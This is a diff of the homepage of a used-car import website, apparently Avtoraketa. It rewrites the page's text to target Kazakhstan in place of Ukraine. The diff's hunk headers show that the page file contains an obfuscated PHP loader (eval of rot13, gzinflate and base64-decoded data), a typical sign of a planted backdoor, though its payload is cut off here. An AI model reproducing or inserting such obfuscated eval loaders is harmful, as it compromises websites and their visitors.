@@ -6,7 +6,7 @@ eval(str_rot13(gzinflate(str_rot13(base64_decode('LUrFDsRJEvyaKNmbGbQnMzP7sjIzs7
 <html class="wide wow-animation" lang="ru">
   <head>
     <!-- Site Title-->
-    <title>Купить БУ Авто из США и Грузии в Украине ✅ Цены от от 7,000$ |  Avtoraketa</title>
+    <title>Купить БУ Авто из США и Грузии в Казахстане  ✅ Цены от от 7,000$ |  Avtoraketa</title>
     <meta charset="utf-8">
 	<meta property="og:title" content="Avtoraketa - доставка авто из США и Грузии">
     <meta property="og:site_name" content="Avtoraketa">
@@ -14,7 +14,7 @@ eval(str_rot13(gzinflate(str_rot13(base64_decode('LUrFDsRJEvyaKNmbGbQnMzP7sjIzs7
     <meta property="og:description" content="Предоставляем улуги профессионального пригона авто из США и Грузии">
     <meta property="og:image" content="/images/avtoraketa.jpg">
 	<meta name="description" content="Авторакета - это выгодная покупка авто с аукционов Америки и авторынков Грузии">
-	<meta name="keywords" content="Авторакета: Поставщик автомобилей из Америки и Грузии в Украину, с аукционов Copart, Manheim, IAAI. Автомобили в наличии, автомобильный аукцион. Самая надежная компания, работа под ключ.">
+	<meta name="keywords" content="Авторакета: Поставщик автомобилей из Америки и Грузии в Казахстан , с аукционов Copart, Manheim, IAAI. Автомобили в наличии, автомобильный аукцион. Самая надежная компания, работа под ключ.">
     <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <script src="/cdn-cgi/apps/head/3ts2ksMwXvKRuG480KNifJ2_JNM.js"></script><link rel="icon" href="images/favicon.ico" type="image/x-icon">
@@ -260,7 +260,7 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
               <!-- Post classic-->
               <article class="post-classic"><a class="post-classic-media" href="avto-iz-usa-mariupol.php"><img src="images/blog-post-1.jpg" alt="" width="870" height="580"/></a>
                 <div class="post-classic-body">
-                  <p class="post-classic-title"><a href="avto-iz-usa-mariupol.php">АВТО ИЗ США В МАРИУПОЛЕ</a></p>
+                  <p class="post-classic-title"><a href="avto-iz-usa-mariupol.php">АВТО ИЗ США в Казахстане</a></p>
                   <ul class="post-classic-meta">
                     <li><span class="icon mdi mdi-account"></span><span><a href="avto-iz-usa-mariupol.php">Cергей Пашковский</a></span></li>
                     <li><span class="icon mdi mdi-calendar-clock"></span>
@@ -278,7 +278,7 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
               <!-- Post classic-->
               <article class="post-classic"><a class="post-classic-media" href="avto-iz-gruzii.php"><img src="images/blog-post-2.jpg" alt="" width="870" height="580"/></a>
                 <div class="post-classic-body">
-                  <p class="post-classic-title"><a href="avto-iz-gruzii.php">Авто из Грузи и в Украину, плюсы и минусы.</a></p>
+                  <p class="post-classic-title"><a href="avto-iz-gruzii.php">Авто из Грузи и в Казахстан , плюсы и минусы.</a></p>
                   <ul class="post-classic-meta">
                     <li><span class="icon mdi mdi-account"></span><span><a href="avto-iz-gruzii.php">Cергей Пашковский</a></span></li>
                     <li><span class="icon mdi mdi-calendar-clock"></span>
@@ -287,7 +287,7 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
                     <li><span class="icon mdi mdi-tag"></span><a href="avto-iz-gruzii.php">Авто из Грузии</a></li>
                   </ul>
                   <div class="post-classic-text">
-                    <p>Cтоит ли покупать б/у авто из Грузии для ввоза в Украину? Выгодна ли такая покупка её новоиспечённому владельцу? Как правильно выбрать автомобиль и не попасть на "кота в мешке", "утопленника" и т.д? </p>
+                    <p>Cтоит ли покупать б/у авто из Грузии для ввоза в Казахстан ? Выгодна ли такая покупка её новоиспечённому владельцу? Как правильно выбрать автомобиль и не попасть на "кота в мешке", "утопленника" и т.д? </p>
                   </div>
                   <div class="post-classic-footer"><a class="button button-sm button-secondary button-nina" href="avto-iz-gruzii.php">Читать дальше</a>
 
@@ -306,7 +306,7 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
                     <li><span class="icon mdi mdi-tag"></span><a href="avto-iz-korea.php">Авто из Кореи</a></li>
                   </ul>
                   <div class="post-classic-text">
-                    <p>Что нужно знать об авто из Кореи в Украину? Первое и главное - эти транспортные средства в 99% случаев не битые и большинство из них с заводской установкой ГБО.</p>
+                    <p>Что нужно знать об авто из Кореи в Казахстан ? Первое и главное - эти транспортные средства в 99% случаев не битые и большинство из них с заводской установкой ГБО.</p>
                   </div>
                   <div class="post-classic-footer"><a class="button button-sm button-secondary button-nina" href="avto-iz-korea.php">Читать дальше</a>
                   </div>
@@ -333,7 +333,7 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
               <!-- Post classic-->
               <article class="post-classic"><a class="post-classic-media" href="top-10-avto-iz-usa.php"><img src="images/blog-post-5.jpg" alt="" width="870" height="580"/></a>
                 <div class="post-classic-body">
-                  <p class="post-classic-title"><a href="top-10-avto-iz-usa.php">ТОП 10 авто из США до 8 000$ для доставки в Украину.</a></p>
+                  <p class="post-classic-title"><a href="top-10-avto-iz-usa.php">ТОП 10 авто из США до 8 000$ для доставки в Казахстан .</a></p>
                   <ul class="post-classic-meta">
                     <li><span class="icon mdi mdi-account"></span><span><a href="top-10-avto-iz-usa.php">Cергей Пашковский</a></span></li>
                     <li><span class="icon mdi mdi-calendar-clock"></span>
@@ -352,7 +352,7 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
             <div class="col-md-9 col-lg-4 col-xl-3 blog-aside">
               <div class="blog-aside-item">
                 <h6>О Нас</h6>
-                <p>Авторакета - это компания, которая осуществляет услуги по покупке и доставке автомобилей из США,Грузии и Кореи в Украину. Мы предоставляем гарантию на все свои услуги, платежи прозрачны, а стоимость Вас приятно удивит.</p><a class="button button-xs button-default-outline button-nina js-open-modal" data-modal="1" href="#">Консультация</a>
+                <p>Авторакета - это компания, которая осуществляет услуги по покупке и доставке автомобилей из США,Грузии и Кореи в Казахстан . Мы предоставляем гарантию на все свои услуги, платежи прозрачны, а стоимость Вас приятно удивит.</p><a class="button button-xs button-default-outline button-nina js-open-modal" data-modal="1" href="#">Консультация</a>
               </div>
               <div class="blog-aside-item">
                 <h6>категории</h6>
